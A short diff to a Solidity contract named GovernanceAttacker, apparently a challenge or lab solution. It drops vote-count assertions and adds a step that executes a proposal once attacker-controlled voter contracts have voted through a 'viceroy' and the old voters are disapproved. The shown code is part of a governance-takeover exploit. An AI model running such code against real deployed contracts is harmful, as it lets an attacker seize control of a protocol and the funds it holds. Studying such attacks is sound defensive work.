@@ -148,8 +148,6 @@ contract GovernanceAttacker {
         for (uint i; i < preCalcedVotersA.length; i++) {
             AttackerVoter(preCalcedVotersA[i]).vote(governance, proposalId, address(viceroy));
         }
-        (uint votes, ) = governance.proposals(proposalId);
-        assert(votes == preCalcedVotersA.length);
 
         // dissaprove old voters
         viceroy.disapproveVoters();
@@ -164,8 +162,9 @@ contract GovernanceAttacker {
         for (uint i; i < preCalcedVotersB.length; i++) {
             AttackerVoter(preCalcedVotersB[i]).vote(governance, proposalId, address(viceroy));
         }
-        // (votes, ) = governance.proposals(proposalId);
-        // assert(votes == 10);
+
+        // execute proposal
+        governance.executeProposal(proposalId);
     }
 
     function deployViceroyAttack(
